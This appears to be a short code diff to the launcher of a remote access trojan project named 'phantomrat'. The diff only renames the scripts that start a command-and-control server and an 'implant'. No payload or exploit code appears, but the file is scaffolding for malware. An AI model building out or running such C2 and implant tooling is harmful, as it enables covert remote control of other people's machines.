@@ -31,7 +31,7 @@ def start_c2_server(host='0.0.0.0', port=8000, debug=False):
     print(f"[*] Starting C2 server on {host}:{port}")
     
     cmd = [
-        sys.executable, 'c2_server.py',
+        sys.executable, 'phantomrat_c2.py',
         '--host', host,
         '--port', str(port)
     ]
@@ -45,7 +45,7 @@ def start_implant(mode='standard'):
     """Start implant with optimizations"""
     print(f"[*] Starting implant in {mode} mode")
     
-    cmd = [sys.executable, 'main.py']
+    cmd = [sys.executable, 'phantomrat_main.py']
     
     if mode == 'test':
         cmd.append('--test')
